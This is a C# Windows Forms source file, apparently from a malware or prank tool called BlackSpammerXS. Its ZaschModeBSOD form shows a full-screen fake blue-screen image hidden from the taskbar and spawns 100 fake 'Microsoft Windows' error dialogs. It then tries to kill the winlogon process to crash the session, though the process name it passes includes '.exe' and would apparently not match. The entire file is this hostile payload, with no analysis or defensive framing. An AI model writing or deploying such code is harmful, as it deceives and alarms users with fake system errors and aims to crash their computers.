using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackSpammerXS;

public class ZaschModeBSOD : Form
{
	private IContainer components = null;

	private PictureBox pictureBox1;

	public ZaschModeBSOD()
	{
		InitializeComponent();
	}

	private async void ZaschModeBSOD_Load(object sender, EventArgs e)
	{
		await Task.Delay(1000);
		BackgroundImage = pictureBox1.Image;
		int c;
		for (c = 0; c < 100; c++)
		{
			Task.Run(delegate
			{
				try
				{
					System.Windows.Forms.MessageBox.Show("Error of " + 7809 / c + " at memory address 0x000e8101f", "Microsoft Windows", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				catch
				{
				}
			});
		}
		await Task.Delay(1000);
		try
		{
			Process.GetProcessesByName("winlogon.exe")[0].Kill();
		}
		catch
		{
		}
		await Task.Delay(150);
		Application.Exit();
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BlackSpammerXS.ZaschModeBSOD));
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		base.SuspendLayout();
		this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		this.pictureBox1.Location = new System.Drawing.Point(59, 52);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(160, 102);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 0;
		this.pictureBox1.TabStop = false;
		this.pictureBox1.Visible = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
		this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		base.ClientSize = new System.Drawing.Size(1940, 1080);
		base.Controls.Add(this.pictureBox1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "ZaschModeBSOD";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "ZaschModeBSOD";
		base.WindowState = System.Windows.Forms.FormWindowState.Maximized;
		base.Load += new System.EventHandler(ZaschModeBSOD_Load);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		base.ResumeLayout(false);
	}
}
